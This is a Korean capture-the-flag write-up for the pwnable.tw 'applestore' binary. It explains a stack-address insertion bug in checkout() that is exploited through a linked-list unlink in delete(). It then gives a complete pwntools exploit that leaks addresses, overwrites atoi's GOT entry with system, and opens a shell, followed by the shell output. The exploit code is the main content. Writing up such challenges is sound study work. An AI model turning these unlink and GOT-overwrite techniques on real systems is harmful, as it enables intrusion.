# [pwnable.tw] \[PWN] applestore

## Key words

* SFP
* Saved EBP
* Unlink
* Double linked list

## Solution

```c
unsigned int checkout()
{
  int v1; // [esp+10h] [ebp-28h]
  char *v2; // [esp+18h] [ebp-20h]
  int v3; // [esp+1Ch] [ebp-1Ch]
  unsigned int v4; // [esp+2Ch] [ebp-Ch]

  v4 = __readgsdword(0x14u);
  v1 = cart();
  if ( v1 == 7174 )
  {
    puts("*: iPhone 8 - $1");
    asprintf(&v2, "%s", "iPhone 8");
    v3 = 1;
    insert(&v2);
    v1 = 7175;
  }
  printf("Total: $%d\n", v1);
  puts("Want to checkout? Maybe next time!");
  return __readgsdword(0x14u) ^ v4;
}
```

버그는 checkout 함수에서 발생합니다. 원래는 heap 영역 주소를 리스트에 넣는데 v2의 스택 주소를 리스트에 넣기 때문에 발생하는 버그입니다. 버그를 트리거한 후, delete 함수를 통해 exploit 가능합니다. 

```c
unsigned int delete()
{
  signed int v1; // [esp+10h] [ebp-38h]
  _DWORD *v2; // [esp+14h] [ebp-34h]
  int v3; // [esp+18h] [ebp-30h]
  int v4; // [esp+1Ch] [ebp-2Ch]
  int v5; // [esp+20h] [ebp-28h]
  char nptr; // [esp+26h] [ebp-22h]
  unsigned int v7; // [esp+3Ch] [ebp-Ch]

  v7 = __readgsdword(0x14u);
  v1 = 1;
  v2 = (_DWORD *)dword_804B070;
  printf("Item Number> ");
  fflush(stdout);
  my_read(&nptr, 0x15u);
  v3 = atoi(&nptr);
  while ( v2 )
  {
    if ( v1 == v3 )
    {
      v4 = v2[2];
      v5 = v2[3];
      if ( v5 )
        *(_DWORD *)(v5 + 8) = v4;
      if ( v4 )
        *(_DWORD *)(v4 + 12) = v5;
      printf("Remove %d:%s from your shopping cart.\n", v1, *v2);
      return __readgsdword(0x14u) ^ v7;
    }
    ++v1;
    v2 = (_DWORD *)v2[2];
  }
  return __readgsdword(0x14u) ^ v7;
}
```

delete 함수는 더블 링크드 리스트를 unlink하는 함수입니다. checkout을 통해 트리거한 버그 덕분에 리스트 중 하나가 nptr을 가리키고 있습니다. 그리고 nptr을 우리가 조작할 수 있기 때문에 unlink 작업 중에 메모리를 overwrite할 수 있게 됩니다.

## Exploit

```python
from pwn import *
import sys

def add(no):
	print p.recv()
	p.sendline("2")
	print p.recv()
	p.sendline(str(no))

def remove(no):
	print p.recv()
	p.sendline("3")
	print p.recv()
	p.send(str(no))

def show():
	print p.recv()
	p.sendline("4")
	print p.recv()
	p.sendline("y")

def checkout():
	print p.recv()
	p.sendline("5")
	print p.recv()
	p.sendline("y")

def leak(addr):
	print p.recv()
	p.sendline("4")
	print p.recv()
	payload = "y\x00" + p32(addr) + "\x00"*4 + p32(0x804b068+4)
	p.sendline(payload)
	p.recvuntil("27: ")
	leak = u32(p.recv(4))
	return leak

target = "./applestore"
libc_name = "./libc_32.so.6"
binary = ELF(target)
libc = ELF(libc_name)

if len(sys.argv) == 1:
	p = process(target, env={"LD_PRELOAD":libc_name})
else:
	p = remote("chall.pwnable.tw", 10104)

for i in range(6):
	add(1)
for i in range(20):
	add(2)

checkout()

leak1 = leak(binary.got['read'])
heap = leak(0x0804B070)
stack = leak(heap+0x4a0)
libc_base = leak1 - (0xf7ef31c0 - 0xf7e1f000)
log.info("libc base  : 0x%x" % libc_base)
log.info("heap       : 0x%x" % heap)
log.info("stack      : 0x%x" % stack)

sfp = stack + 32
mal_sfp = binary.got['atoi'] + 0x22
log.info("SFP of del : 0x%x" % sfp)
log.info("Mal SFP    : 0x%x" % mal_sfp)

raw_input()
payload = "27"
payload += "\x00"*8
payload += p32(sfp-12)
payload += p32(mal_sfp)
payload += "\x00"*3
remove(payload)

p.recv()
#payload = "1234567812345678"
payload = p32(libc_base + libc.symbols['system'])
payload += ";/bin/sh;"
p.send(payload)
p.interactive()
```

스택 프레임의 sfp를 조작하여 atoi의 got를 덮어 썼습니다.

## 실행 결과

```
Item Number> 
[*] Switching to interactive mode
sh: 1: @?b?: not found
$ id
uid=1000(applestore) gid=1000(applestore) groups=1000(applestore)
```

